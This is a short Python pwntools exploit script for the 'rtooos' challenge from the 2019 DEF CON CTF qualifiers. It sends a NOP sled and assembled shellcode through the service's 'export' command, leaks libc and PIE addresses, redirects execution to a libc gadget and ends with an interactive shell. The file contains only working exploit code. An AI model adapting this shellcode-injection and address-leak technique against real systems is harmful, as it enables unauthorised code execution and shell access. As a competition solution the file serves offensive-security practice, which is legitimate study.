#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = remote('rtooos.quals2019.oooverflow.io', 5000)

libc_fclose = 0x8da20 - 0x1a78
libc_exit = 0x8da20 - 0x1a70
got_puts = 0x8da20 - 0x1b50

data = '''
mov rax, -0x%x
mov di, 0x64
out dx, al

mov rax, -0x%x
mov di, 0x64
out dx, al

mov rax, 0x3000
mov rsi, 0x10
mov rdi, 0x63
out dx, al

mov rax, -0x%x
mov di, 0x63
mov rsi, 0x8
out dx, al

mov rax, 0x3000
mov di, 0x64
out dx, al

''' % (libc_fclose, libc_exit, got_puts)
q = asm(data)

context.log_level ='debug'
payload = '\x90' * 100
payload += q

for i in xrange(7):
    r.sendlineafter('[RTOoOS>', 'export a')

r.sendlineafter('[RTOoOS>', 'export a=%s' % payload)

libc = u64(r.recvuntil("\x7f")[1:]+'\x00\x00')
pie = u64(r.recv(6)[1:]+"\x00\x00\x00") - 0x1bee

r.sendline("/bin/sh\x00")

sleep(0.1)
r.sendline(p64(libc - 0x000000000003a8f0 + 0x0000000000062CF9))
r.interactive()
